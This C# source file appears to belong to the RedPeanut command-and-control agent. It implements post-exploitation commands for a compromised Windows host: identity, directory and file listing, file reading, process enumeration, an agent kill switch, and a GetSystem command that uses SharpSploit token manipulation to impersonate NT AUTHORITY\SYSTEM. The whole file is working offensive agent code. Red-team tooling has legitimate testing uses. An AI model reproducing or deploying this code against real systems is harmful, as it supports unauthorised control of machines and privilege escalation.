using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace StandardCommandImpl
{
    public class Program
    {
        public static void GetUid(string [] param)
        {
            try
            {
                Console.WriteLine("[*] You are {0}", WindowsIdentity.GetCurrent().Name);
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error executing cd");
            }
        }

        public static void GetPwd(string [] param)
        {
            try
            {
                Console.WriteLine("[*] Current directory {0}", Directory.GetCurrentDirectory());
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error executing cd");
            }
        }

        public static void GetCd(string [] param)
        {
            try
            {
                if (Directory.Exists(param[0]))
                    Directory.SetCurrentDirectory(param[0]);
                Console.WriteLine("[*] Current directory {0}", Directory.GetCurrentDirectory());
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error executing cd");
            }
        }

        public static void GetCat(string[] param)
        {
            try
            {
                if (File.Exists(param[0]))
                {
                    using (StreamReader file = new StreamReader(param[0]))
                    {
                        int counter = 0;
                        string ln;

                        while ((ln = file.ReadLine()) != null)
                        {
                            Console.WriteLine("[*] {0}",ln);
                            counter++;
                        }
                        file.Close();
                    }
                }
                else
                {
                    Console.WriteLine("[*] File not found {0}");
                }
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error executing cat");
            }
        }

        public static void GetLs(string[] param)
        {
            try
            {
                Console.WriteLine(string.IsNullOrEmpty(param[0].Trim()) ? SharpSploit.Enumeration.Host.GetDirectoryListing().ToString() : SharpSploit.Enumeration.Host.GetDirectoryListing(param[0].Trim()).ToString());
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error executing ls");
            }
        }

        public static void GetPs(string[] param)
        {
            try
            {
                Console.WriteLine(SharpSploit.Enumeration.Host.GetProcessList().ToString());
            }
            catch (Exception)
            {
                Console.WriteLine("[*] Error executing ps");
            }
        }

        /// <summary>
        /// Impersonate the SYSTEM user. Equates to `ImpersonateUser("NT AUTHORITY\SYSTEM")`. (Requires Admin)
        /// </summary>
        /// <returns>True if impersonation succeeds, false otherwise.</returns>
        public static void GetSystem(string[] param)
        {
            try
            {
                SharpSploit.Credentials.Tokens t = new SharpSploit.Credentials.Tokens();
                if (t.GetSystem())
                {
                    Console.WriteLine("User: " + t.WhoAmI());
                    Console.WriteLine("Successfully executed getsystem");
                }
                else
                {
                    Console.WriteLine("Failed to execute getsystem");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("GetSystem error : " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        public static void KillAgent(string[] param)
        {
            throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
        }
    }   
}
